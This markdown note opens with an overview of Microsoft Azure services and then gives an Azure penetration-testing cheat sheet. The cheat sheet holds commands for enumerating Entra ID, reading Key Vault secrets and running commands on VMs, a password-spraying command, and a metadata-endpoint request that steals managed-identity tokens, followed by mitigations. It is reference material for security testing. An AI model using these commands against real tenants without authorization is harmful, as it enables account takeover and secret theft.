# What is Azure?
Microsoft Azure is a cloud computing service provided by Microsoft. It offers a wide array of cloud services, including computing power, storage, databases, networking, analytics, machine learning, and more. Azure allows individuals and businesses to build, deploy, and manage applications and services through Microsoft's global network of data centers.

## Key Concepts:

- Regions and Availability Zones:

  - Azure is organized into regions, each comprising multiple data centers. Similar to AWS, these regions are designed to provide redundancy and ensure high availability. Availability Zones within a region provide additional resilience.
- Compute Services:

  - Virtual Machines (VMs): Azure VMs allow you to run virtualized Windows or Linux servers in the cloud, similar to AWS EC2.
  - Azure Functions: Serverless compute service that allows you to run event-triggered code without provisioning or managing servers.
- Storage Services:

  - Blob Storage: A scalable object storage solution for unstructured data, commonly used for backups, media files, and data storage.
  - Azure Disk Storage: Provides persistent and high-performance block storage for VMs.
- Database Services:

  - Azure SQL Database: A fully managed relational database service, similar to AWS RDS.
  - Cosmos DB: A globally distributed, multi-model database service designed for fast and responsive applications.
- Networking:

  - Virtual Network (VNet): Allows you to create private, isolated networks in the Azure cloud. Similar to AWS VPC.
  - Azure Load Balancer: Distributes incoming network traffic across multiple servers to ensure no single server is overwhelmed.
- Security:

  - Azure Active Directory (AAD): A cloud-based identity and access management service that helps secure and manage user identities.
  - Azure Security Center: Monitors and strengthens the security posture of your Azure resources.
- Management Tools:

  - Azure Portal: A web-based interface for managing and monitoring Azure resources.
  - Azure DevOps: A set of development tools for planning, coding, testing, and deploying applications.

## Advantages of Azure:

- Integration with Microsoft Products: Seamless integration with other Microsoft products, such as Windows Server, Active Directory, and Office 365.
- Hybrid Cloud Capabilities: Azure supports hybrid cloud scenarios, allowing you to integrate on-premises data centers with the cloud.
- Enterprise Focus: Well-suited for enterprise-level solutions and applications.

## Getting Started:

- Sign up for an Azure account on the Azure website.
- Take advantage of the free tier to explore and experiment with various Azure services.
- Azure provides extensive documentation and tutorials to help you understand and use their services.

Like AWS, Azure is a vast platform with a wide range of services. Exploring specific services based on your requirements and gradually building your knowledge will help you make the most of Microsoft Azure.

---

# Azure Penetration Testing

> Azure pentesting overlaps heavily with **Entra ID (Azure AD)** attacks. Identity is the perimeter.

## Setup

```bash
# Azure CLI
brew install azure-cli        # or: curl -sL https://aka.ms/InstallAzureCLIDeb | bash
az login                      # interactive
az login --service-principal -u <appId> -p <secret> --tenant <tenantId>

# Who am I / what subscriptions?
az account show
az account list -o table
```

## Enumeration

```bash
# Users, groups, roles (Entra ID)
az ad user list -o table
az ad group list -o table
az role assignment list --all -o table

# Resources, storage, key vaults
az resource list -o table
az storage account list -o table
az keyvault list -o table
az keyvault secret list --vault-name <vault>
az keyvault secret show --vault-name <vault> --name <secret>

# VMs (run-command lets you execute on the guest if you have rights)
az vm list -o table
az vm run-command invoke -g <rg> -n <vm> --command-id RunShellScript --scripts "id"
```

## Unauthenticated / recon tooling

```bash
# Enumerate tenant + validate usernames (no creds needed)
o365spray --validate --domain target.com
o365spray --enum --domain target.com

# AADInternals (PowerShell) — tenant recon, token manipulation
Get-AADIntTenantID -Domain target.com
Get-AADIntLoginInformation -Domain target.com

# ROADtools — dump the whole directory once you have a token
roadrecon auth -u user@target.com -p 'Password'
roadrecon gather
roadrecon gui
```

## Common attack paths

- **Password spraying** against Entra ID (watch Smart Lockout):

```bash
o365spray --spray --domain target.com -U users.txt -p 'Spring2026!'
```

- **Managed Identity SSRF** on an Azure VM/App Service → steal tokens:

```bash
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true"
```

- **Illicit consent grant** (phishing an OAuth app) for persistent access.
- **BloodHound + AzureHound** to map Entra ID attack paths.

## Automated tooling

```bash
prowler azure
scout suite azure
```

## Mitigation checklist

- Enforce MFA + Conditional Access; disable legacy auth protocols.
- Least-privilege RBAC; review role assignments; PIM for just-in-time admin.
- Restrict Managed Identity metadata access; use IMDS with care.
- Enable Microsoft Defender for Cloud + sign-in risk policies.

## Related

- [Active Directory Basics](../Active%20Directory/Active%20Directory%20Basics.md)
- [Top Cloud Security Risks](Top%20Cloud%20Security%20Risks.md)
